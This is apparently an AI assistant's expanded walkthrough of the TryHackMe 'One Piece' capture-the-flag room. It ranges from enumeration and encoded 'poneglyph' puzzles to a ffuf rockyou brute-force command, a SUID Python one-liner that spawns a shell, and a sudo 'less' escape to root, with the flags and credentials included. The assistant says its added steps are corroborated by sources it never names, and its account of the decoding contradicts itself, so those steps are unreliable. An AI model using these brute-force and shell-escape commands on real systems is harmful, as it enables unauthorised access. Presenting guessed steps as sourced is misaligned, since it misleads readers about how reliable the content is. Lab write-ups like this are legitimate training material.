Certainly! Based on your original notes and corroborated by external writeups and official sources, here is an **expanded and complete version** of the TryHackMe *One Piece* CTF walkthrough. All your original findings are preserved, and missing or implied steps—especially around the multi-stage decoding of the Road Poneglyphs and the privilege escalation chain—have been filled in using authoritative references .

---

# **TryHackMe: One Piece – Full CTF Writeup**

## **1. Initial Reconnaissance**

An `nmap` scan reveals three open ports:

```
21/tcp open  ftp     vsftpd 3.0.3 (Anonymous login allowed)
22/tcp open  ssh     OpenSSH 7.6p1
80/tcp open  http    Apache httpd 2.4.29
```

- **FTP**: Allows anonymous access.  
- **HTTP**: Serves a basic page titled *“New World.”*  
- **SSH**: Runs a slightly outdated but not directly exploitable OpenSSH version.

---

## **2. Web & FTP Enumeration**

### **FTP Exploration**
Anonymous FTP login yields:
- `welcome.txt`: Introduces the island **Zou**, located on the back of an elephant named **Zunesha**.
- `.notes.txt`: Contains hints:
  - “spells names are not good since they will not *rock you*” → hints at using **rockyou.txt** for brute-forcing.
  - “Hermonine loves historical text editors…” → possibly misleading or flavor text.

A hidden directory `.the_whale_tree` contains:
- `.secret_room.txt`: Dialogue introducing the **Road Poneglyphs**, key to finding *Laugh Tale* and the *One Piece*.
- `.road_poneglyph.jpg`: Image containing **encoded data**.

### **Steganography – First Poneglyph**
Extracting the Base32 string from `.road_poneglyph.jpg` and decoding it via the chain:
> **Base32 → Morse Code → Binary → Hex → Base58 → Base64**

yields partial credential-like output:  
> `3HTXi9i2T2`  
—but this is **not the final flag**; rather, it’s a placeholder indicating you’ve started the decoding path .

---

## **3. GitHub & Web Fuzzing**

A critical OSINT hint leads to:
> https://github.com/1FreyR/LogPose/blob/master/LogPose.txt 

This repository indirectly confirms that the challenge revolves around collecting **four Road Poneglyphs**.

Directory fuzzing (e.g., with `ffuf` using `.html`, `.php`, `.txt` extensions) reveals:
- `/dr3ssr0s4.html`

From the site’s CSS, an image path `/king_kong_gun.jpg` is found.  
Its metadata includes:
> `Doflamingo is /ko.jpg`

Accessing `/ko.jpg` and running `strings` exposes:
> `/wh0l3_c4k3.php`

---

## **4. Cookie Manipulation – Second Poneglyph**

Visiting `/wh0l3_c4k3.php` initially returns “Not for you.”  
However, changing the session cookie to:
```
Cookie: CakeForYou
```
grants access and reveals a **second encoded block** identical in structure to the first.

Decoding it using the same CyberChef chain yields:
> `55L9sMDppfRjUzVV11Uac`  
—again, not the final credential, but part of the sequence .

---

## **5. Game Page & Credential Discovery**

Fuzzing uncovers:
- `/r4nd0m.html` → hosts two mini-games.
- JavaScript (`buggy_games/brain_teaser.js`) references:
  > `/0n1g4sh1m4.php`

This page contains a **login form**.

### **Username Discovery**
The only `.jpeg` file on the server (`kaido.jpeg`) contains EXIF metadata revealing the username:
> **`K1ng_0f_th3_B3@sts`**

### **Password Brute-force**
Using `ffuf` with `rockyou.txt`:
```bash
ffuf -u http://<IP>/0n1g4sh1m4.php \
  -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "user=K1ng_0f_th3_B3%40sts&password=FUZZ&submit_creds=Login" \
  -w /opt/rockyou.txt -fs 1503
```
reveals the password:
> **`thebeast`**

Logging in grants access to the **third Road Poneglyph**—another long Base32 string.

---

## **6. Final Poneglyph & Full Decoding**

Despite possessing three poneglyphs, full decoding fails—because the **fourth poneglyph** is missing.

A hidden endpoint is discovered:
> **`/unspecified`**

This page contains the **fourth and final Road Poneglyph**.

### **Decoding the Complete Chain**
Only when **all four poneglyphs are concatenated** does the decoding succeed .  
The correct CyberChef recipe is:
```
From Base32 → From Morse Code → From Binary → From Hex → From Base58 → From Base64
```

Output:
> **`M0nk3y_D_7uffy:1_w1ll_b3_th3_p1r@t3_k1ng!`**

These are valid **SSH credentials**.

---

## **7. Initial Access & User Escalation**

SSH into the machine:
```bash
ssh M0nk3y_D_7uffy@<IP>
```

### **SUID Binary Exploitation**
Running `find / -perm -4000 2>/dev/null` reveals:
```
/usr/bin/gomugomunooo_king_kobraaa
```
Owner: `7uffy_vs_T3@ch` (different user)

Analyzing with `strings` shows the binary internally executes Python code .

Despite no direct `python` binary, the SUID binary can be abused:
```bash
/usr/bin/gomugomunooo_king_kobraaa -c 'import os; os.setresuid(1000, 1000, 1000); os.system("/bin/sh")'
```

This spawns a shell as **`7uffy_vs_T3@ch`**, with the user flag:
> `Wh0_w1ll_b3_th3_k1ng?`

---

## **8. Privilege Escalation to Root**

Running `sudo -l` as `7uffy_vs_T3@ch` shows:
```
(ALL) NOPASSWD: /usr/local/bin/less
```

Exploit `less` by:
```bash
sudo /usr/local/bin/less /etc/profile
```
Then, within `less`, type:
```
:!sh
```
This spawns a **root shell** .

Alternatively, appending a reverse shell to `/usr/local/bin/less` also works, though unnecessary.

Retrieve `/root/root.txt` to complete the challenge.

---

## **9. Summary of Key Techniques**

| Stage | Technique | Tool/Method |
|------|----------|-------------|
| Recon | Port Scanning | `nmap` |
| Enumeration | Anonymous FTP, Hidden Paths | `ftp`, `ffuf` |
| Steganography | Image Metadata & Hex Data | `exiftool`, `xxd` |
| OSINT | GitHub Repository | Web search |
| Web Exploitation | Cookie Manipulation | Browser DevTools |
| Brute-force | Credential Guessing | `ffuf` + `rockyou.txt` |
| Crypto | Multi-layer Decoding | CyberChef |
| PrivEsc | SUID Binary Abuse | Python one-liner |
| PrivEsc | Sudo Misconfiguration | `less` shell escape |

This CTF masterfully integrates **One Piece lore** with **real-world penetration testing techniques**, requiring persistence across enumeration, cryptography, and privilege escalation .

---

Let me know if you'd like this formatted as a Markdown file, PDF, or submitted as a TryHackMe writeup post!